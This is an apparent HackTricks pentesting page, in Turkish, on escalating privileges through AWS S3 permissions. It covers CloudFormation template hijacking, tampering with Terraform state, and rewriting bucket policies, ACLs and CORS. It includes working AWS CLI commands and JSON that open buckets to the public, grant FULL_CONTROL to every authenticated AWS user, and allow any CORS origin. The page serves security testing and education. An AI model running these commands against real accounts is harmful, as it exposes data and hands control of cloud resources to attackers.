# AWS - S3 Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## S3

### `s3:PutBucketNotification`, `s3:PutObject`, `s3:GetObject`

Bu izinlere sahip bir saldırgan, ilgili buckets üzerinde kaynakları ele geçirip ayrıcalıkları yükseltebilir.

Örneğin, "cf-templates-nohnwfax6a6i-us-east-1" adlı bir cloudformation bucket üzerinde bu **permissions over a cloudformation bucket**'a sahip bir saldırgan deployment'ı ele geçirebilir. Erişim aşağıdaki policy ile verilebilir:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"s3:PutBucketNotification",
"s3:GetBucketNotification",
"s3:PutObject",
"s3:GetObject"
],
"Resource": [
"arn:aws:s3:::cf-templates-*/*",
"arn:aws:s3:::cf-templates-*"
]
},
{
"Effect": "Allow",
"Action": "s3:ListAllMyBuckets",
"Resource": "*"
}
]
}
```
Ve hijack mümkün çünkü bir şablonun **bucket'a yüklendiği** andan şablonun **dağıtıldığı** ana kadar **küçük bir zaman penceresi** vardır. Bir saldırgan kendi hesabında, bir bucket bildirimi gönderildiğinde tetiklenecek bir **lambda function** oluşturabilir ve o **bucket**'ın içeriğini hijack edebilir.

![](<../../../images/image (174).png>)

Pacu modülü [`cfn__resouce_injection`](https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details#cfn__resource_injection) bu saldırıyı otomatikleştirmek için kullanılabilir.\
Daha fazla bilgi için orijinal araştırmayı inceleyin: [https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/](https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/)

### `s3:PutObject`, `s3:GetObject` <a href="#s3putobject-s3getobject" id="s3putobject-s3getobject"></a>

Bunlar S3'e **nesne yüklemek ve nesne almak** için gereken izinlerdir. AWS içindeki (ve dışındaki) birkaç servis **config files** depolamak için S3 storage kullanır.\
Bu dosyalara **okuma erişimi** olan bir saldırgan içinde **gizli bilgiler** bulabilir.\
Bu dosyalara **yazma erişimi** olan bir saldırgan veriyi **değiştirip bazı servisleri kötüye kullanarak ayrıcalıkları yükseltmeye** çalışabilir.\
Bunlara bazı örnekler:

- Eğer bir EC2 instance'ı **user data**'yı bir S3 bucket'ında saklıyorsa, bir saldırgan bunu değiştirerek EC2 instance içinde **arbitrary code execute** edebilir.

### `s3:PutObject`, `s3:GetObject` (optional) over terraform state file

[terraform](https://cloud.hacktricks.wiki/en/pentesting-ci-cd/terraform-security.html) state dosyalarının cloud sağlayıcıların blob storage'ına, ör. AWS S3'e kaydedilmesi çok yaygındır. State dosyalarının dosya uzantısı `.tfstate`'dir ve bucket isimleri genellikle terraform state dosyası içerdiğini belli eder. Genellikle her AWS hesabının, hesabın durumunu gösteren state dosyalarını depolamak için böyle bir bucket'ı bulunur.
Ayrıca gerçek dünya hesaplarında çoğu zaman tüm geliştiricilerin `s3:*` izinlerine ve bazen iş kullanıcılarının bile `s3:Put*` izinlerine sahip olduğu sık görülen bir durumdur.

Dolayısıyla, bu dosyalar üzerinde listelenen izinlere sahipseniz, pipeline'da `terraform` ayrıcalıklarıyla (çoğu zaman `AdministratorAccess`) RCE elde etmenizi sağlayan bir saldırı vektörü vardır; bu da sizi cloud hesabının admini yapar. Ayrıca bu vektörü, `terraform`'un meşru kaynakları silmesini sağlayarak bir hizmet reddi (DoS) saldırısı yapmak için kullanabilirsiniz.

Doğrudan kullanılabilir exploit kodu için *Abusing Terraform State Files* bölümündeki açıklamayı *Terraform Security* sayfasında takip edin:

{{#ref}}
../../../../pentesting-ci-cd/terraform-security.md#abusing-terraform-state-files
{{#endref}}

### `s3:PutBucketPolicy`

Aynı hesaptan olması gereken bir saldırgan, aksi halde `The specified method is not allowed will trigger` hatası tetiklendiği durumlarda, bu izin ile kendine bucket(lar) üzerinde daha fazla izin verebilir; böylece bucket'ları okuma, yazma, değiştirme, silme ve açığa çıkarma yetkisi elde eder.
```bash
# Update Bucket policy
aws s3api put-bucket-policy --policy file:///root/policy.json --bucket <bucket-name>

## JSON giving permissions to a user and mantaining some previous root access
{
"Id": "Policy1568185116930",
"Version":"2012-10-17",
"Statement":[
{
"Effect":"Allow",
"Principal":{
"AWS":"arn:aws:iam::123123123123:root"
},
"Action":"s3:ListBucket",
"Resource":"arn:aws:s3:::somebucketname"
},
{
"Effect":"Allow",
"Principal":{
"AWS":"arn:aws:iam::123123123123:user/username"
},
"Action":"s3:*",
"Resource":"arn:aws:s3:::somebucketname/*"
}
]
}

## JSON Public policy example
### IF THE S3 BUCKET IS PROTECTED FROM BEING PUBLICLY EXPOSED, THIS WILL THROW AN ACCESS DENIED EVEN IF YOU HAVE ENOUGH PERMISSIONS
{
"Id": "Policy1568185116930",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Stmt1568184932403",
"Action": [
"s3:ListBucket"
],
"Effect": "Allow",
"Resource": "arn:aws:s3:::welcome",
"Principal": "*"
},
{
"Sid": "Stmt1568185007451",
"Action": [
"s3:GetObject"
],
"Effect": "Allow",
"Resource": "arn:aws:s3:::welcome/*",
"Principal": "*"
}
]
}
```
### `s3:GetBucketAcl`, `s3:PutBucketAcl`

Bir saldırgan bu izinleri kötüye kullanarak belirli buckets üzerinde kendisine **daha fazla erişim** verebilir.\
Saldırganın aynı hesaptan olması gerekmediğini unutmayın. Ayrıca yazma erişimi
```bash
# Update bucket ACL
aws s3api get-bucket-acl --bucket <bucket-name>
aws s3api put-bucket-acl --bucket <bucket-name> --access-control-policy file://acl.json

##JSON ACL example
## Make sure to modify the Owner’s displayName and ID according to the Object ACL you retrieved.
{
"Owner": {
"DisplayName": "<DisplayName>",
"ID": "<ID>"
},
"Grants": [
{
"Grantee": {
"Type": "Group",
"URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
},
"Permission": "FULL_CONTROL"
}
]
}
## An ACL should give you the permission WRITE_ACP to be able to put a new ACL
```
### `s3:GetObjectAcl`, `s3:PutObjectAcl`

Bir saldırgan, bu izinleri buckets içindeki belirli nesneler üzerinde kendisine daha fazla erişim vermek için kötüye kullanabilir.
```bash
# Update bucket object ACL
aws s3api get-object-acl --bucket <bucekt-name> --key flag
aws s3api put-object-acl --bucket <bucket-name> --key flag --access-control-policy file://objacl.json

##JSON ACL example
## Make sure to modify the Owner’s displayName and ID according to the Object ACL you retrieved.
{
"Owner": {
"DisplayName": "<DisplayName>",
"ID": "<ID>"
},
"Grants": [
{
"Grantee": {
"Type": "Group",
"URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
},
"Permission": "FULL_CONTROL"
}
]
}
## An ACL should give you the permission WRITE_ACP to be able to put a new ACL
```
### `s3:GetObjectAcl`, `s3:PutObjectVersionAcl`

Bu ayrıcalıklara sahip bir saldırganın belirli bir nesne sürümüne bir Acl atayabilmesi beklenir.
```bash
aws s3api get-object-acl --bucket <bucekt-name> --key flag
aws s3api put-object-acl --bucket <bucket-name> --key flag --version-id <value> --access-control-policy file://objacl.json
```
### `s3:PutBucketCORS`

s3:PutBucketCORS iznine sahip bir saldırgan, bir bucket'ın CORS (Cross-Origin Resource Sharing) yapılandırmasını değiştirebilir; bu yapılandırma hangi web domainlerinin onun uç noktalarına erişebileceğini kontrol eder. Eğer izinleri gevşeten bir politika ayarlarsa, herhangi bir web sitesi doğrudan bucket'a istek yapabilir ve bir tarayıcıdan yanıtları okuyabilir.

Bu, potansiyel olarak, bucket'ta barındırılan bir web uygulamasına ait kimliği doğrulanmış bir kullanıcı saldırganın web sitesini ziyaret ederse, saldırganın izinleri gevşetilmiş CORS politikasını kötüye kullanabileceği ve uygulamaya bağlı olarak kullanıcının profil verilerine erişebileceği veya hatta kullanıcının hesabını ele geçirebileceği anlamına gelir.
```bash
aws s3api put-bucket-cors \
--bucket <BUCKET_NAME> \
--cors-configuration '{
"CORSRules": [
{
"AllowedOrigins": ["*"],
"AllowedMethods": ["GET", "PUT", "POST"],
"AllowedHeaders": ["*"],
"ExposeHeaders": ["x-amz-request-id"],
"MaxAgeSeconds": 3000
}
]
}'
```
{{#include ../../../../banners/hacktricks-training.md}}
